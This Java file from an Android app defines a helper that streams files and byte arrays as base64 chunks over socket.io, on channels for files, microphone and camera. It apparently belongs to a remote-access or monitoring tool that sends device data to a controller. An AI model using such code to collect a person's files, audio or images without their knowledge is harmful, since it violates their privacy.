package com.fason.app.core.network;

import android.util.Base64;

import com.fason.app.core.Protocol;

import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.Arrays;

import io.socket.client.Socket;

/**
 * Chunked binary transfer over socket.io. Streams from disk or chunks
 * in-memory byte arrays, keeping RAM usage constant (~900KB).
 *
 * Protocol: start → chunk[n] → end
 * Small payloads (&lt; CHUNK_THRESHOLD) use a single message for backward compatibility.
 */
public final class TransferHelper {

    /** Raw bytes per chunk — 384KB (divisible by 3 for clean base64, ~512KB encoded). */
    static final int RAW_CHUNK = 384 * 1024;

    /** Payloads at or above this size are chunked; below → single message. */
    public static final int CHUNK_THRESHOLD = 512 * 1024;

    private TransferHelper() {}

    public static boolean shouldChunk(long size) {
        return size >= CHUNK_THRESHOLD;
    }

    /**
     * Stream a file from disk in chunks without loading the whole file into RAM.
     *
     * @param socket     active socket connection
     * @param channel    protocol channel (e.g. Protocol.FILES, Protocol.MIC)
     * @param file       file to stream
     * @param startMeta  extra fields for the start message (name, path, file, etc.)
     */
    public static void streamFile(Socket socket, String channel, File file, JSONObject startMeta) {
        if (socket == null || file == null || !file.exists()) return;

        try {
            String tid = generateId();
            long fileSize = file.length();
            int totalChunks = (int) Math.ceil((double) fileSize / RAW_CHUNK);

            JSONObject start = clone(startMeta);
            start.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_START);
            start.put(Protocol.KEY_TRANSFER_ID, tid);
            start.put(Protocol.KEY_TOTAL_CHUNKS, totalChunks);
            start.put(Protocol.KEY_TOTAL_SIZE, fileSize);
            socket.emit(channel, start);

            try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file))) {
                byte[] buf = new byte[RAW_CHUNK];
                int idx = 0;
                int read;
                while ((read = bis.read(buf)) > 0) {
                    byte[] chunk = (read == buf.length) ? buf : Arrays.copyOf(buf, read);

                    JSONObject c = new JSONObject();
                    c.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_CHUNK);
                    c.put(Protocol.KEY_TRANSFER_ID, tid);
                    c.put(Protocol.KEY_CHUNK_INDEX, idx);
                    c.put(Protocol.KEY_CHUNK_DATA, Base64.encodeToString(chunk, Base64.NO_WRAP));
                    socket.emit(channel, c);

                    idx++;
                    Thread.sleep(20);
                }
            }

            JSONObject end = new JSONObject();
            end.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_END);
            end.put(Protocol.KEY_TRANSFER_ID, tid);
            socket.emit(channel, end);
        } catch (Exception ignored) {}
    }

    /**
     * Send a byte array in chunks (for in-memory data like camera images).
     *
     * @param socket     active socket connection
     * @param channel    protocol channel (e.g. Protocol.CAMERA)
     * @param data       raw bytes to send
     * @param startMeta  extra fields for the start message (image, cameraId, etc.)
     */
    public static void sendChunked(Socket socket, String channel, byte[] data, JSONObject startMeta) {
        if (socket == null || data == null || data.length == 0) return;

        try {
            String tid = generateId();
            int totalChunks = (int) Math.ceil((double) data.length / RAW_CHUNK);

            JSONObject start = clone(startMeta);
            start.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_START);
            start.put(Protocol.KEY_TRANSFER_ID, tid);
            start.put(Protocol.KEY_TOTAL_CHUNKS, totalChunks);
            start.put(Protocol.KEY_TOTAL_SIZE, data.length);
            socket.emit(channel, start);

            int offset = 0;
            for (int i = 0; i < totalChunks; i++) {
                int len = Math.min(RAW_CHUNK, data.length - offset);

                JSONObject c = new JSONObject();
                c.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_CHUNK);
                c.put(Protocol.KEY_TRANSFER_ID, tid);
                c.put(Protocol.KEY_CHUNK_INDEX, i);
                c.put(Protocol.KEY_CHUNK_DATA, Base64.encodeToString(
                    Arrays.copyOfRange(data, offset, offset + len), Base64.NO_WRAP));
                socket.emit(channel, c);

                offset += len;
                Thread.sleep(20);
            }

            JSONObject end = new JSONObject();
            end.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_END);
            end.put(Protocol.KEY_TRANSFER_ID, tid);
            socket.emit(channel, end);
        } catch (Exception ignored) {}
    }

    /** Read a small file entirely into memory. Only safe for files &lt; CHUNK_THRESHOLD. */
    public static byte[] readSmallFile(File file) {
        try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file))) {
            byte[] data = new byte[(int) file.length()];
            int read, total = 0;
            while ((read = bis.read(data, total, data.length - total)) > 0) {
                total += read;
            }
            return total == data.length ? data : null;
        } catch (Exception e) {
            return null;
        }
    }

    private static JSONObject clone(JSONObject src) {
        try {
            return new JSONObject(src.toString());
        } catch (Exception e) {
            return new JSONObject();
        }
    }

    private static String generateId() {
        return Long.toHexString(System.currentTimeMillis()) + "_" +
               Integer.toHexString((int) (Math.random() * 0xFFFF));
    }
}
